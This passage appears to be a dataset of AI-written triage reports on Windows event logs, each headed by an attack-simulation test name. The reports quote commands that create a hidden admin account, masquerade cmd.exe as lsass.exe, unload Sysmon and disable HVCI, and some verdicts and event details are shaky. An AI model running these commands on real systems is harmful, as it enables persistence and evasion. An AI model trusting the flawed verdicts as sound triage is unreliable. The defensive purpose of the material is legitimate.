   - Check for any recent administrative tasks or changes that may align with these activities and verify with the responsible persons.

2. **Further Investigation:**
   - Review recent access logs to identify who performed these actions.
   - Check the integrity of security settings, especially around RDP, and revert any unauthorized changes.
   - Utilize EDR solutions for a deeper forensic analysis to understand the extent and root cause of the activities.

3. **Long-term Recommendations:**
   - Conduct a security audit and review policies on account privileges and remote access.
   - Improve monitoring systems to detect such anomalies in real-time in the future.

The circumstances suggest potentially unauthorized changes that require a precautionary investigation to rule out a compromise."
Create Windows System File with Attrib,"Upon reviewing the provided Windows event logs, there are several points of interest:

### Security Logs
1. **EventID 4616 (Security):** This event log entry indicates a system time change by the service account LOCAL SERVICE. The time difference between the previous and new times is extremely small, which may suggest synchronization activities. This is typically benign unless seen in context with other malicious signs.

### Sysmon Logs
1. **Cmd.exe Execution:**
   - Several instances of `cmd.exe` are running various scripts that manipulate files in the `%temp%` directory (e.g., checking for the existence of a file, appending text to a file, changing attributes). While the operations themselves (like using `IF EXIST` and `attrib.exe`) are not inherently malicious, the frequency and nature of the operations in a short time span can be suspicious, particularly in an enterprise environment.
   - Command lines observed include `cmd.exe` with conditional file existence checks and attribute modification using `attrib.exe`. These could potentially be used in scripting for legitimate administrative tasks, but could also indicate attempts to modify or hide files.

2. **wevtutil.exe and conhost.exe Execution:**
   - **wevtutil.exe** is seen executing several times over a short period, which could indicate log manipulation activities. By itself, it is a legitimate Windows utility used to manage event logs, but exceptional use may indicate log clearing or event log modification.
   - **conhost.exe** typically functions as part of console window operations but appears frequently in conjunction with cmd operations, which is expected as conhost manages command prompt windows.

3. **Microsoft Edge Update Activity:**
   - Multiple instances of `MicrosoftEdgeUpdate.exe` initiated by `SYSTEM` user indicate update executions. This includes service start, software update, and registration actions, which are typical for background updates triggered by scheduled tasks or manual update checks. 
   - Activities associated with Edge Update are consistent with legitimate processes but verifying if these updates align with known scheduled update times might be prudent. A bulk execution of such processes can be indicative of an administrative activity or an attacker using legitimate software for malicious purposes.

### Application Logs
1. **edgeupdate Service Stopped:**
   - The log confirms the stopping of `edgeupdate` service twice within a few seconds. Stopping services can be a normal housekeeping procedure or a precursor to tampering, especially if the service is critical or has elevated permissions.

### Overall Summary
Though the logs show several instances of processes that could potentially be used for malicious purposes, none of the logs explicitly confirm malicious activity. The behavior of using cmd.exe to create and modify files, coupled with frequent wevtutil.exe operations, could indicate suspicious behavior especially if unfamiliar to administrators.

**Resolution: SUSPICIOUS**

### Guidance on How to Proceed:
1. **Conduct Deeper Analysis:**
   - Review scheduled tasks to verify the nature of edgeupdate activity.
   - Check for any scripts or scheduled tasks that use cmd for logging or automation.
   - Investigate user activities, specifically `admin_test`, to understand the context of these operations.
   
2. **Monitor for Anomalies:**
   - Deploy enhanced logging and monitoring on this and similar systems to catch any escalation attempts or sensitive file manipulations.
   - Consider alerting for unexpected use of wevtutil.exe, especially related to suppressing or modifying logs.
   
3. **Investigate User Account Activity:**
   - Ensure that user credentials, specifically for `admin_test`, have not been compromised.
   - Maintain vigilance on accounts with high integrity level operations for unauthorized behaviors.
   
Further investigation is required to rule out or confirm malicious intent, especially in a particular context such as an ongoing incident or reported compromises."
Invoke CHM with InfoTech Storage Protocol Handler,"Upon analysis of the provided logs, several points of interest and potential indicators of suspicious activity have been identified.

### Windows PowerShell Log:
- The logs indicate the use of PowerShell with the command `powershell.exe & {Invoke-ATHCompiledHelp -InfoTechStorageHandler its -HHFilePath $env:windir\\hh.exe -CHMFilePath Test.chm}`. The command `Invoke-ATHCompiledHelp` is not commonly associated with benign or typical administrative tasks, and the use of `hh.exe` (HTML Help executable) can be an obfuscation technique used by attackers to execute payloads.

### Sysmon Log:
- There are multiple entries indicating the execution of core system utilities such as `wevtutil.exe`, `conhost.exe`, `HOSTNAME.EXE`, and `whoami.exe` under the user `SERVER002\\admin_test`. The frequent use of `wevtutil.exe` is suspicious as it can be used to clear Event Logs, potentially indicating an attempt to hide malicious activity.
- The execution of `powershell.exe` with similar command-line arguments in Sysmon corroborates potentially suspicious PowerShell activity seen in the PowerShell logs.

### Security Log:
- The Security logs show typical system logins and privilege assignments. The entry with event ID 4672 shows that `NT AUTHORITY\\SYSTEM` was granted several high-level privileges. While this is a normal part of system operation, it can be leveraged by malicious entities if they gain SYSTEM-level access.

### System Log:
- Contains typical Windows Update activities and does not present any obvious signs of compromise.

### Application Log:
- Not provided; however, initial logs point toward potential malicious behavior even without additional application-level context.

### Assessment & Resolution:
Based on the analysis above, the key points of concern are the PowerShell activity with unusual commands and the frequent execution of `wevtutil.exe`, which may indicate log tampering. These activities stand out as atypical for standard operations and warrant further investigation.

### Resolution: SUSPICIOUS
The logs contain activities that appear suspicious, particularly the PowerShell command execution and potential log tampering attempts through `wevtutil.exe`. It is recommended to:
1. Investigate the origin of the PowerShell scripts and commands being executed.
2. Verify user activities associated with `admin_test` and review any unauthorized changes or access.
3. Examine any changes to critical system files or configurations.
4. Consider using Endpoint Detection and Response (EDR) tools for real-time monitoring and analysis of further suspicious activities.

Further detailed investigation is necessary to determine if this is indeed an ongoing compromise or potential misuse of administrative capabilities."
office-365-Disable-AntiPhishRule,"Based on the provided logs, let's examine the different events and analyze any suspicious activity:

### PowerShell Logs:
- A series of PowerShell events show the execution of scripts that involve disabling Anti-Phishing rules:
  - The command involves using `Connect-ExchangeOnline` with clear-text credentials, which is highly unusual and risky.
  - The scripts disable anti-phishing rules: `Disable-AntiPhishRule -Identity $test.Name -Confirm:$false`.
  - The use of `ConvertTo-SecureString -AsPlainText -Force` indicates forced conversion of plain text passwords, implying a lack of security.

### Sysmon Logs:
- Multiple Sysmon logs show processes being launched by the user `SERVER002\admin_test` with a focus on `powershell.exe`:
  - The PowerShell process is used in a suspicious manner to disable anti-phishing protections.
  - `wevtutil.exe` indicates potential cleanup activity or log manipulation behavior.
  - The execution policy set to `Restricted` is suspicious in combination with executed scripts, aiming to bypass system protections or policies.

### Application Logs:
- Shows a standard log event from the Software Protection Platform Service, which doesn't indicate any issues by itself.

### System Logs:
- Primarily contain Windows Update activity, which is expected and does not by itself indicate malicious activity.
  
### Assessment:
- The logs reveal suspicious PowerShell activity aimed at disabling anti-phishing protection, usage of clear-text credentials, and potential scripting intended to manipulate security settings.
- The involvement of sensitive activities without proper security protocols, such as the use of unprotected credentials and the disabling of anti-phishing rules, raises significant red flags.

### Conclusion:
- **Resolution: MALICIOUS**
- The analyzed activity is consistent with potential unauthorized or malicious intent targeting security features and improper use of credentials.
- Immediate action is recommended to secure credentials, audit other systems for similar activity, and review account activity associated with `admin_test`.

### Guidance on How to Proceed:
- Disable or reset the affected credentials and investigate any network connection or service access through such credentials.
- Investigate if there are any unauthorized changes or access to the organization's email systems.
- Strengthen PowerShell execution policies and logging settings to prevent such scripting activities in the future.
- Conduct a thorough security assessment of the affected host and potentially impacted systems."
Disable Hypervisor-Enforced Code Integrity (HVCI),"Upon review of the provided Sysmon and PowerShell logs, the following observations indicate suspicious behavior:

1. **Unusual Command Execution**:
   - Multiple instances of command-line processes (`cmd.exe`, `reg.exe`, `findstr.exe`) are being executed in quick succession. These are querying registry settings related to `DeviceGuard` and `HypervisorEnforcedCodeIntegrity`.
   - This kind of query pattern could suggest reconnaissance for security settings on the system, possibly to ascertain the status of security controls.
   
2. **Registry Modification**:
   - There is evidence that `powershell.exe` is used to execute a command that modifies a registry key (`HKLM\SYSTEM\CurrentControlSet\Control\DeviceGuard\Scenarios\HypervisorEnforcedCodeIntegrity`) with the `/f` switch, forcing an update. This command is designed to disable Hypervisor-enforced code integrity by setting its `Enabled` value to `0`.
   - Such registry modifications, particularly to critical security features, are indicative of attempts to weaken system security, potentially as a precursor to further malicious actions.

3. **PowerShell Activity**:
   - The PowerShell log shows the `powershell.exe` command initiating with arguments to run a registry modification command. This behavior aligns with activity typically associated with script-based threats attempting to modify security settings covertly.

4. **Process Integrity Level**:
   - The processes in question are running at a high integrity level, suggesting administrative credentials are being used. This escalation is typical in scenarios where unauthorized changes are being attempted on a system.

5. **Consistent User**:
   - The user `SERVER002\admin_test` is associated with these activities. If this user is not expected to perform such tasks, further scrutiny is advised. 

Given these observations, the logs present clear signs of potentially malicious activity involving attempts to modify critical security settings via high-integrity processes. The actions logged could be part of malicious behavior aiming to circumvent or disable security features of the Windows operating system.

### Assessment and Guidance:

- **Resolution**: MALICIOUS
- **Threats Identified**: Potential disabling of Hypervisor-Enforced Code Integrity (HVCI), reconnaissance for security settings.
- **Risk**: Unauthorized system access, possible persistence, data exfiltration, or further exploitation due to weakened security postures.
  
### Immediate Actions:

1. **Isolate the Host**: To prevent spread or further compromised actions.
2. **Conduct Detailed Forensics**: Investigate the extent of the compromise, accessing logs prior to the activity noted here.
3. **User Confirmation**: Verify if actions by `admin_test` were authorized.
4. **Remediation**: Re-enable any security settings altered, assess for any further changes.
5. **Update Security Policies**: Reassess user privileges and monitoring configurations.
"
Create Hidden User in Registry,"Upon analyzing the provided events from the Sysmon, Application, Security, System, and PowerShell logs, the following observations and findings can be made:

### Observations:

1. **Frequent Execution of System Utilities:**
   - There are multiple instances of `wevtutil.exe` and `conhost.exe` being executed by the user `admin_test`. While execution of these utilities isn't inherently suspicious, the frequency and the timing are worth noting.

2. **Commands and Processes Indicative of User Account Manipulation:**
   - The execution of `cmd.exe` with a command-line argument that modifies user accounts using `NET USER` and alters the registry using `REG ADD` is highly suspicious:
     ```plaintext
     ""cmd.exe"" /c NET USER fileOperator$ At0micRedTeam! /ADD /expires:never & REG ADD ""HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\Userlist"" /v fileOperator$ /t REG_DWORD /d 0
     ```

3. **Creation and Manipulation of User Account:**
   - Events in the Security log indicate the creation, enabling, and modification of a new user account `fileOperator$`. This account was added with a non-standard password and set to never expire, which are indicators of potentially malicious activity aimed at maintaining unauthorized access.

4. **Event 4720 and Event 4722 (User Account Creation and Enabling):**
   - The creation and enabling of an account named `fileOperator$` further confirms unauthorized user account manipulation.
   - An event (4738) shows modification to user account settings for `fileOperator$`.

5. **Registry Modification (Event 17988 - Sysmon):**
   - Alteration of registry keys to hide user accounts in the Windows logon screen, another indicator of attempting to conceal the presence of a user account.

6. **Time Change Events:**
   - Modification of the system time was observed, which can be used as an evasion tactic to confuse log timelines or reset event triggers (Security log 4616).

### Assessment:

The events detailed above indicate a sequence of actions that match techniques commonly used to gain and maintain unauthorized access to a system. The activities involving user account manipulation (creation of hidden accounts, registry modifications) and potential attempts to alter system logs or timestamps are classic signs of malicious behavior. The user `admin_test` carried out these actions, which raises an alarm about their legitimacy and intent.

### Threats and Risks Identified:

- **Backdoor Installation:** The creation of a hidden user account with elevated privileges potentially provides persistent access.
- **System Manipulation and Enumeration:** The use of native binaries and command-line tools suggests efforts to blend in these activities within normal operations and avoid detection.
- **Log Tampering and Evasion:** System time adjustments suggest potential evasion tactics to disrupt or manipulate log data.

### Guidance:

Considering the nature of these activities, immediate actions should be undertaken:

1. **Resolution: MALICIOUS**

2. **Next Steps:**
   - Isolate the affected machine from the network to prevent further unauthorized access.
   - Conduct a comprehensive review of all accounts, especially the newly created `fileOperator$`, and remove any unauthorized accounts.
   - Perform a deeper forensic analysis to determine if further compromise has occurred.
   - Review and strengthen security policies, especially account creation and privilege elevation procedures.
   - Notify relevant stakeholders, including IT security teams, to address and remediate potential security gaps.

These steps are essential to eliminate unauthorized access, understand the breach's scope, and prevent future incidents."
Disable Windows Registry Tool,"Upon analyzing the provided Windows event logs, the following points of interest and potential indicators of compromise have been identified:

1. **Time Change Events**: 
   - Multiple EventID 4616 from the Security log and EventID 1 from the System log indicate that the system time was changed twice within a very short period. While this can occur for legitimate reasons (e.g., time synchronization), frequent unscheduled changes without a clear justification or coordination with a time synchronization service could be suspicious, especially if combined with other indicators of compromise.

2. **Service Stopped**: 
   - The Application log shows an event indicating that a service related to `edgeupdate` was stopped. This is typically normal behavior but could be suspicious if paired with other signs of malicious activity.

3. **Registry Modification**:
   - A Sysmon EventID 1 shows the execution of `cmd.exe` with a command to modify the Windows registry to add `DisableRegistryTools`, which could be an attempt to restrict registry access and hide tracks. This is a highly suspicious activity commonly associated with malware or unauthorized administrative actions.

4. **Use of `wevtutil.exe`**:
   - Several Sysmon logs indicate the use of `wevtutil.exe`, commonly used for managing Windows event logs. This could suggest that logs are being exported or altered, which is suspicious if not part of a normal administrative task, especially when combined with the aggressive registry modification activity.

5. **NT AUTHORITY\SYSTEM Usage**: 
   - The Sysmon logs indicate processes executed by `NT AUTHORITY\SYSTEM` account, which is normal for some operations like system updates or services. However, it's crucial to correlate these with other suspicious activities, especially when they follow or precede anomalous activities.

6. **Command Execution Tracing**:
   - Execution of commands like `whoami.exe` and `hostname.exe` has been logged in Sysmon; while these commands by themselves are not inherently malicious, they might indicate lateral movement or recon activity if executed by unauthorized or unexpected users.

Based on the analysis of the logs provided:

- **SUSPICIOUS**: The evidence of registry modification and potential manipulation or assessment of event logs without any preceding scheduled task or known administrative task is deemed highly suspicious and warrants further investigation. While there's no absolute proof of compromise, the actions related to the registry change and potential event log manipulation could indicate preparatory steps for malicious activity.

### Recommendations:
- Conduct a more detailed forensic investigation on the host to determine the intent behind the registry modification and verify if any legitimate administrative task was scheduled to manipulate event logs.
- Validate if the `wevtutil.exe` usage aligns with internal processes and authorized user actions.
- Check for other indicators of lateral movement or deeper intrusion using network logs and additional host behavior analytics.
- Increase monitoring on `SERVER002` for any further suspicious activities or signs of compromise.
- Consider restoring the system from a clean backup if unauthorized changes are detected to mitigate any potential risk from malicious software or configurations."
System File Copied to Unusual Location,"### Log Analysis:

#### Security Log:

- **EventID 5379**: This event indicates failed credential validation operations. Multiple entries show attempts to access Microsoft accounts (user tokens and certificates) associated with `MicrosoftAccount:user=02txoixylodcstop`, all returning with an error code `3221226021`. This indicates an unsuccessful attempt to access credentials, often seen in scenarios involving incorrect credentials or unauthorized access.

#### Sysmon Log:

- **Suspicious PowerShell Activity**: The Sysmon log shows execution of a PowerShell command:
  ```powershell
  ""powershell.exe"" & {copy-item \""""$env:windir\System32\cmd.exe\"""" -destination \""""$env:allusersprofile\cmd.exe\"""", start-process \""""$env:allusersprofile\cmd.exe\"""", sleep -s 5 , stop-process -name \""""cmd\"""" | out-null}""
  ```
  This command sequence is highly suspicious:
  - Copying `cmd.exe` to a new location is often used to bypass restrictions/security measures.
  - Starting a new process of `cmd.exe` post-copy.
  - Stopping the new `cmd` process after 5 seconds.
  Such behavior indicates attempts to establish persistence or escalate privileges, which is often suggestive of malicious intent.

#### Windows PowerShell Log:

- The provided PowerShell logs confirm the aforementioned activity, with the specific PowerShell command further detailed as part of the logging. The commands executed in this log, such as copying and executing `cmd.exe`, are consistent with malicious scripts attempting to manipulate the system environment.

### Assessment:

- The consistent failed access attempts (EventID 5379) coupled with the suspicious PowerShell activity suggest efforts to perform unauthorized access and possibly maintain persistence or privilege escalation on the host.

### Resolution: **MALICIOUS**

### Recommended Actions:

1. **Immediate Containment**: Isolate the affected machine (Server002) from the network to prevent further potential lateral movement or data exfiltration.
  
2. **Credentials Review**: Investigate and reset user credentials associated with the failed login attempts to ensure they are not compromised.

3. **Deeper Investigation**: Conduct a thorough forensic investigation to identify any other malicious artifacts or compromised systems within the environment.

4. **System Restore/Remediation**: Consider restoring the affected system to a known good state and patching any security vulnerabilities found during the investigation.

5. **Security Monitoring**: Enhance monitoring on PowerShell executions and credential access events across all systems, using tools like Sysmon for detailed logging.

6. **User Awareness Training**: Provide training to users on recognizing suspicious activities and the importance of password security to mitigate unauthorized access attempts."
attrib - hide file,"Upon reviewing the provided Windows event logs, several points of interest and potential anomalies have been observed. Here's a detailed analysis:

1. **Application Log:**
   - The entry from the Software Protection Platform Service (SPP) indicates normal operations related to licensing and protection features. No direct indicators of malicious activity from this log entry.

2. **Security Log:**
   - The events with ID 4616 suggest system time changes. While time changes on a system can be suspicious, if they occur frequently or during unusual times, these entries match well with accompanying system log time changes related to time service and seem benign in isolation.

3. **Sysmon Log:**
   - There are several instances of common Windows utility executions such as `whoami.exe`, `conhost.exe`, `wevtutil.exe`, `HOSTNAME.EXE`, and `cmd.exe`:
     - **Whoami.exe**: Nothing inherently suspicious about `whoami.exe` but given its association with process `wsmprovhost.exe`, it warrants attention for potential misuse in lateral movements.
     - **Wevtutil.exe**: Multiple executions by `admin_test` could indicate log querying or clearing attempts, especially given the simultaneous usage of command prompt utilities. If unexpected for this user, it requires further investigation.
     - **Cmd.exe**: This event highlights a complex and unusual command line involving directory creation and file attribute setting in a temporary directory. While command line executions are common in Windows systems, the degree of complexity, including hiding files with the `attrib` command, might suggest attempt to obfuscate actions. This kind of command is often seen in scripts or in preparation for further undisclosed activities.
     - **MicrosoftEdgeUpdate.exe**: Normal system and application update processes are reflected here; however, the presence in temporary file paths could suggest possible tampering or repackaging if not expected.

4. **System Log:**
   - Time adjustments as documented in this log correlate with security log time changes. This might seem suspicious if no maintenance was scheduled, given time manipulation can be used to evade logging mechanisms or align with malicious campaign activities.

5. **Windows PowerShell Log:**
   - The logs provided do not contain specific PowerShell entries, which in an investigative context might require further attention if expected logs are absent, assuming PowerShell would typically be in use.

**Assessment and Conclusion:**
- **SUSPICIOUS**: The presence and behavior of certain command-line activity, most notably involving `cmd.exe` and `attrib.exe` with a degree of hidden file manipulation, alongside notable utility execution like `wevtutil.exe` by a user with high privileges (`admin_test`) indicates the potential for unauthorized or nefarious activity that warrants closer scrutiny.
  
**Guidance on How to Proceed:**
- Conduct further review on the user `admin_test`'s activities and access patterns, particularly exploring intent and any anomalies over time.
- Verify the legitimacy of scripts or scheduled tasks that might execute such command lines.
- Cross-reference with other security solutions (e.g., endpoint or network monitoring tools) for corroborative evidence of inappropriate behavior.
- Investigate the context around time adjustments and `MicrosoftEdgeUpdate.exe` activity.
- Perform a detailed historical log review, especially focusing on any unexpected PowerShell activity that may not be present in these datasets.

Given these activities, deeper forensic analysis might expose clearer indicators of compromise, if present."
Store file in Alternate Data Stream (ADS),"Upon reviewing the provided log entries spanning Sysmon, System, Application, Security, and PowerShell logs, the following analysis highlights both suspicious and potentially benign activities:

1. **Sysmon Logs:**
   - There are multiple log entries showing execution of `wevtutil.exe` and `conhost.exe`. `wevtutil.exe` is a legitimate tool to obtain event log information but is often used in malicious activities to clear event logs. The consistent use of `wevtutil.exe` warrants attention.
   - There is an anomalous execution of `powershell.exe` with a suspicious command line `""(Test-Path C:\Users\Public\Libraries\yanki -PathType Container) {, New-Item -ItemType Directory ...}""`. The command creates a directory and uses `cmd.exe` for file operations in a potentially obfuscated manner, indicative of malicious activity.
   - `cmd.exe` has been executed with parameters directing output to an Alternate Data Stream (desktop.ini:desktop.ini). This is often used to hide malicious files/data.

2. **System Logs:**
   - Entries indicate a time change. While not inherently suspicious, if unauthorized, it could point to an attempt to manipulate log timestamps.

3. **Application and Security Logs:**
   - The logs note expectations in the starting and stopping of services, not immediately indicative of malicious activity beyond potentially covering traces or initializing custom services.

4. **Windows PowerShell Logs:**
   - The logs indicate a PowerShell session with suspicious behavior that aligns with the Sysmon log: creating directories and manipulating existing ones in a disguised manner.

### Assessment:
- The use of `wevtutil.exe` combined with the obscured PowerShell script and use of alternate data streams usually aligns with attempts to remain undetected and to execute hidden tasks or maintain persistence on the system.

### Conclusion:
- **Resolution: MALICIOUS** - The activities highlighted suggest a compromise with operations likely aimed at evading detection and maintaining control or data extraction capabilities on the host.

### Guidance to Proceed:
1. **Immediate Action:**
   - Isolate the affected machine from the network to prevent further propagation of potential threats.
   
2. **Investigation:**
   - Conduct a thorough forensic investigation to identify the full scope and intent of the malicious activities.
   - Review and analyze any additional logs beyond the timeframe provided to spot continued or repeated patterns.

3. **Remediation:**
   - Clear any unauthorized changes such as manipulated timestamps.
   - Eliminate discovered persistence mechanisms and ensure that malicious scripts or binaries are removed.

4. **Preventative Measures:**
   - Reiterate endpoint protection policies and update signatures.
   - Enhance detection mechanisms for similar attempts, particularly with administrative tools like PowerShell and wevtutil being used in succession. 

5. **User Training:**
   - Train users on recognizing and reporting unusual system behavior, as part of a defense-in-depth strategy."
Lolbin Gpscript logon option,"Upon analyzing the provided Windows event logs, I have identified multiple entries across different log types for the system ""Server002"". Here's a detailed analysis:

1. **Security Log:**
   - Event ID 4616 indicates that there are changes related to system time adjustments. While time changes could potentially be linked to malicious activity (e.g., timestamp manipulation), in this context, the change seems immediate and does not appear to imply a pattern of abuse or unauthorized adjustments. The presence of the ""LOCAL SERVICE"" and ""NT AUTHORITY"" users performing this action suggests system-level time synchronization activities, which could be benign.

2. **Sysmon Log:**
   - There are various Event ID 5 logs showing the execution of processes like `wevtutil.exe`, `conhost.exe`, and `hostname.exe`. The processes `wevtutil.exe` and `conhost.exe` are legitimate Windows utilities. The execution of `wevtutil.exe` might suggest querying or clearing of event logs, but without additional context or evidence like unusual command-line arguments, it doesn’t directly suggest malicious intent.
   - The process executions by `SERVER002\admin_test` are often with high integrity level, indicating an administrative action, but within its legitimate context, particularly if `admin_test` is a known administrative user.

3. **System Log:**
   - Time synchronization activity involving `svchost.exe` is recorded repeatedly which corresponds to adjustments possibly through `time.windows.com` for NTP protocol updates. This is standard for server or domain time synchronization and aligns with keeping system time accurate.

4. **Application Log:**
   - The entries from `edgeupdate` suggesting ""Service stopped"" are a normal part of application updates management, specifically for Microsoft Edge updates.
   - Software Protection Platform Service log entries correlate with this maintenance activity.

5. **Other Observations:**
   - There is regular involvement of the Microsoft Edge Update Service, which appears to be conducting authorized updates and installations. The processes like `MicrosoftEdgeUpdate.exe` are executed by `NT AUTHORITY\SYSTEM` and do not show attributes commonly found in unauthorized installations or persistent malware.

**Assessment & Conclusion:**

Overall, while some entries, like time changes and unusual use of system utilities (e.g., `wevtutil.exe`), can be viewed through a lens of suspicion, the entirety of the context presented in these logs doesn't clearly indicate malicious activity. The entries align with ordinary system and application updates, time synchronization activities, and administrative actions performed by `SERVER002\admin_test`.

**Resolution:** **BENIGN** - The logs contain benign activity typical for Windows administrative tasks and software updates. No signs of compromise or significant threats have been identified. 

For complete assurance, however, it can be valuable to confirm whether the `admin_test` user account activities are expected and regular within your organization's scope of use and ensure all software updates are configured as intended."
Unload Sysmon Filter Driver,"After a thorough analysis of the provided Windows event logs, we can make the following assessments:

### Analysis of Sysmon Logs:
- **Sysmon EventID 1 (Process Creation):** 
  - The logs show multiple events involving process creation. Notably, a PowerShell script initiates a check for any 'SysmonDrv' filter drivers, which then proceeds to unload them if found. The command `fltMC.exe unload SysmonDrv` raises a red flag as it indicates an attempt to remove a monitoring tool from the system.
  - `cmd.exe` with the command-line argument `/c fltmc.exe unload SysmonDrv` is highly suspicious. This action seems to be trying to evade monitoring by disabling Sysmon.
  - Repeated execution of `wevtutil.exe` processes suggest potential manipulation of event logs, which adversaries often use to cover their tracks.

- **Sysmon EventID 5 (Process Termination):** 
  - Corresponding termination logs of the processes that were created. Consistent termination of processes like `fltMC.exe`, `findstr.exe`, `wevtutil.exe`, and `conhost.exe` reflecting a series of actions potentially aimed at disabling system monitoring.

### Analysis of Security Logs:
- **Security EventID 4616 (System Time Changed):**
  - Detected a series of rapid time changes within the machine. Although time adjustment is not inherently malicious, it might be used to manipulate timestamps in event logs related to malicious activities.

### Analysis of System Logs:
- **Kernel-General and FilterManager Logs:**
  - The increase in time-related changes and `FilterManager` events indicating interaction with drivers support the hypothesis of tampering with the operating system components to bypass security mechanisms.
  
### Conclusion
The behavior observed indicates a notable attempt to evade software that might monitor or restrict actions on the machine. The combination of unloading Sysmon, utilizing PowerShell scripts for checks, and multiple executions of log and system utilities is a strong indication of malicious intent, primarily to cover tracks or disable security auditing.

### Resolution
The collective events and their timing suggest that these logs demonstrate **MALICIOUS** activity. There is clear evidence of actions taken to evade detection by removing system monitoring components and potentially manipulating logs. Further immediate investigation is recommended, including isolating the system from the network, running a comprehensive security audit, and reviewing active security controls."
Service Registry Permissions Weakness,"Upon reviewing the provided Windows event logs, here's a detailed analysis focusing on potential indicators of malicious activity:

### Indicators of Suspicious Activity

1. **PowerShell Activity:**
   - The PowerShell logs reveal a command execution using `get-acl` on sensitive registry keys, particularly targeting `HKLM\SYSTEM\CurrentControlSet\Services\*` and a specific `weakservicename`. This command was run multiple times, suggesting inspection of service permissions which can be indicative of enumeration possibly to find privilege escalation vectors or misconfigured services.

2. **Process Execution Patterns (Sysmon Log):**
   - Frequent usage of administrative tools such as `whoami.exe` and `wevtutil.exe` by the `admin_test` user is noted. While these tools can be used for legitimate administrative purposes, their repetitive and clustered execution alongside PowerShell could indicate reconnaissance or potential lateral movement preparation.
   - The `wsmprovhost.exe` (Parent Process) spawning the PowerShell and other processes like `hostname.exe` and more could suggest remote PS execution via WinRM, part of remote management tasks, which if unexpected, could have security implications.

3. **Edge Update Activity:**
   - There are numerous EdgeUpdate activities in the Sysmon logs indicating update and installation tasks being performed. While this could be benign, it might also indicate tampering if these updates or installations were unscheduled or unauthorized.

4. **Time Changes (System & Security Logs):**
   - There are multiple instances showing slight time changes handled by `svchost.exe`, which by itself isn't alarming unless associated with other indicators. Time changes can sometimes be a precursor or part of covering tracks in some attack methodologies.

### Risk Assessment

Based on the indicators observed:

- The repetitive use of PowerShell to query sensitive registry keys and frequent sysmon process logs indicate potential reconnaissance or an early stage of a more complex attack strategy.
- The presence of administrative command executions (e.g., whoami, wevtutil) alongside PowerShell activities further question the intent, as these tools are often used during attempts to escalate privileges or gather system information.

### Resolution

Considering the analyzed evidence:

- **Resolution:** **SUSPICIOUS** - The logs contain activities that suggest anomalous behavior, particularly around the use of PowerShell and command-line utilities typical in reconnaissance and privilege escalation stages. This requires further investigation to rule out or confirm malicious intent. It would be advisable to check user activity logs, corroborate user intentions with IT policy on remote process execution, and investigate the runs of these admin tools to determine if they align with authorized administrative tasks.

### Guidance on How to Proceed

- **Immediate Action:**
  - Contact the user associated with the `admin_test` account to verify whether the logged activities were authorized and expected.
  - Check for any recent escalations in privileges or changes to user account policies or permissions associated with this user.

- **Further Investigation:**
  - Analyze past logs or other systems for similar patterns involving the `admin_test` user or the use of PowerShell with similar parameters.
  - Ensure all security patches and updates for system software, particularly Edge, are verified against expected schedules and versions.
  - Review access controls and monitor for unauthorized access attempts moving forward.

- **Proactive Measures:**
  - Strengthen user activity monitoring to catch unauthorized or unexpected administrative actions.
  - Implement stricter least-privilege and role-based access to administrative tools and sensitive data."
Clear Event Logs via VBA,"Upon analyzing the provided log entries, several indicators are consistent with potentially malicious activity:

1. **PowerShell Script Execution**:
   - There are multiple PowerShell events where the script from a GitHub URL (`https://raw.githubusercontent.com/file/file-file/master/files/data.002/src/script.ps1`) is being executed via PowerShell. This activity could suggest a download and execution of a remote script, which is a common technique used in malware or attacks like PowerShell-based exploitation.
   - Command-line arguments indicate the execution of an external script intended to ""ClearLogs,"" which might attempt to erase traces of commands or activities. Such behavior is typically indicative of obfuscation or attempts to cover up malicious activity. 

2. **Suspicious Use of Built-In Tools**:
   - The logs indicate the use of tools like `whoami.exe`, `hostname.exe`, and multiple instances of `wevtutil.exe`, which could signify reconnaissance activities or log clearing.
   - Sysmon logs also indicate multiple instances of `rundll32.exe` and `svchost.exe` running with command-line arguments that are not typical for benign use, though more context would be needed for definitive conclusions.

3. **Elevated Privileges**:
   - Events ID 4672 in the Security log show that several special privileges were assigned to the ""SYSTEM"" user, including SeDebugPrivilege, SeTakeOwnershipPrivilege, etc., which could indicate privilege escalation or activities requiring system-level access beyond normal operations.

4. **Credential Access Attempts**:
   - There are multiple Event ID 5379 logs showing ""Credential Manager"" attempted and failed operations which included accessing Microsoft Account and Windows Live tokens. Such operations might represent credential access attempts.

5. **Convergence of Known Malicious Indicators**:
   - Combining the execution of PowerShell scripts from a non-verified source, utilization of built-in Windows utilities, and special privilege assignments aligns well with known attack vectors and post-exploitation frameworks aiming to ensure persistence, privilege escalation, and lateral movement within a network.

### Conclusion:
Based on the analysis of the log entries, it is clear that activities such as downloading and executing scripts from external sources using PowerShell, high-privilege assignments to accounts, and potential credential access attempts collectively indicate potential compromise.

**Resolution**: MALICIOUS

### Recommendations:
1. **Containment**: Immediately isolate the host from the network to prevent further spread or communication with any Command and Control (C2) servers.
2. **Investigation**: Conduct a thorough forensic analysis to determine the extent of the breach and identify any additional compromised systems.
3. **Remediation**: Based on findings, patch vulnerabilities exploited by the attacker, change all credentials that might have been exposed, and restore affected systems from clean backups.
4. **Monitoring and Hardening**: Deploy enhanced monitoring using EDR (Endpoint Detection and Response) solutions, and enable logging and alerts for suspicious activities. Review and strengthen PowerShell execution policies and user privilege assignments to mitigate future risks."
Masquerading as Windows LSASS process,"Upon analysis of the provided Windows event logs across various log types (Security, Application, System, Windows PowerShell, and Sysmon logs), here are the observed activities and events:

1. **Security Log Events:**
   - Several 5379 events indicate unsuccessful credential validation attempts for Microsoft Account and Windows Live services. These return a failure code of `3221226021`, commonly indicating a failed attempt to access or authenticate Microsoft services.
   - Multiple 4624 logon events with LogonType 5 are seen, which are service logons. These appear normal as they are service start-ups.
   - Privileged use events (4672) list several high-level privileges and reflect SYSTEM activity which seems typical for a server environment.

2. **Sysmon Log Events:**
   - The execution of `cmd.exe` to copy the `cmd.exe` file to `%SystemRoot%\Temp\lsass.exe` and executing it as `lsass.exe` stands out as a suspicious activity (Process ID 1372). This behavior is indicative of potential privilege escalation or obfuscation attempt, commonly observed in malicious activities.
   - Several instances of common Windows processes are seen, such as `wuauclt.exe`, `taskhostw.exe`, `svchost.exe`, indicating normal system and update operations, mainly correlating with Windows Update activities.

3. **PowerShell Activity:**
   - The PowerShell script execution logs show controlled and deliberate PowerShell commands with restricted execution policy, indicating some level of crafted script execution, potentially related to administrative tasks.

4. **Application and System Logs:**
   - The logs indicate regular update activities for Windows Defender and other system components, suggesting routine update and maintenance behavior.
